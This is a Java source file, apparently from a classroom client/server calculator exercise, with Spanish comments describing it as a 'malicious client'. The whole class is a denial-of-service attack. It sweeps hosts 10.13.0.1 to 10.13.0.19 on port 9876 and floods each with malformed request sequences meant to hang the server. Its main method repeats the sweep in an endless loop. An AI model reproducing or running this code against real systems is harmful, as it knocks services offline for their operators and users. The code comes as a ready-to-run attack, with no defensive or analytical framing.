package org.example.ClienteCalculo.src;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;

public class ClienteMaligno {

	// METODO QUE REALIZA UNA CONEXION MALICIOSA Y ENVIA PETICIONES AL SERVIDOR PARA COLGARLO
	public void colgar(String ip) throws IOException {
		InetSocketAddress servidor = new InetSocketAddress(ip, 9876);  // DIRECCION DEL SERVIDOR
		Socket socket = new Socket();  // SE CREA EL SOCKET
		socket.connect(servidor, 2500);  // SE CONECTA AL SERVIDOR CON UN TIEMPO DE ESPERA DE 2500ms

		InputStream is = socket.getInputStream();  // SE OBTIENE EL INPUTSTREAM PARA LEER DEL SOCKET
		BufferedReader bfr = ClienteCalculo.getBufferedReader(is);  // SE CREAR EL BUFFEREDREADER PARA LEER
		OutputStream os = socket.getOutputStream();  // SE OBTIENE EL OUTPUTSTREAM PARA ENVIAR AL SERVIDOR
		PrintWriter pw = ClienteCalculo.getPrintWriter(os);  // SE CREA EL PRINTWRITER PARA ENVIAR DATOS

		// SE REALIZAN PETICIONES MALICIOSAS AL SERVIDOR PARA SOBRECARGARLO
		for (int i = 0; i < 100; i++) {
			// SE ENVIA UNA SECUENCIA DE DATOS MALICIOSOS AL SERVIDOR
			pw.println("+++++");
			pw.println("aa");
			pw.println("bb");
			pw.println("bb");
			pw.println("***");
			pw.println("aa");
			pw.println("bb");
			pw.flush();  // SE HACE FLUSH PARA ASEGURARSE DE QUE LOS DATOS SE ENVIEN

			// SE ENVIA UNA SECUENCIA DE NUMEROS DEL 0 AL 19 AL SERVIDOR
			for (int j = 0; j < 20; j++) {
				pw.print(j);  // SE IMPRIMEN LOS NUMEROS AL SERVIDOR
			}
			pw.println();  // SE TERMINA LA SECUENCIA DE NUMEROS
			pw.flush();  // SE HACE FLUSH DE NUEVO

			// SE LEE LA RESPUESTA DEL SERVIDOR (NO SE UTILIZA)
			bfr.readLine();
		}
	}

	// METODO QUE REALIZA UNA SECUENCIA DE PETICIONES MALICIOSAS A MULTIPLES SERVIDORES
	public static void darPasada() {
		for (int i = 1; i < 20; i++) {
			ClienteMaligno conexion = new ClienteMaligno();  // SE CREA UNA NUEVA INSTANCIA DE CLIENTEMALIGNO
			System.out.println("Colgando 10.13.0." + i);  // SE MUESTRA EN CONSOLA QUE SE ESTA COLGANDO EL SERVIDOR
			try {
				conexion.colgar("10.13.0." + i);  // SE LLAMA AL METODO colgar PARA REALIZAR LA PETICION
			} catch (IOException e) {
				e.printStackTrace();  // SI HAY UNA EXCEPCION, SE IMPRIME EL TRAZA DE LA EXCEPCION
			}
		}
	}

	// METODO PRINCIPAL QUE INICIA EL ATAQUE MALICIOSO
	public static void main(String[] args) {
		// BUCLE INFINITO QUE MANTIENE EL ATAQUE MALICIOSO EN CURSO
		while (true) {
			darPasada();  // SE LLAMA AL METODO DARPASADA QUE REALIZA LA PETICION A MULTIPLES SERVIDORES
		}
	}
}
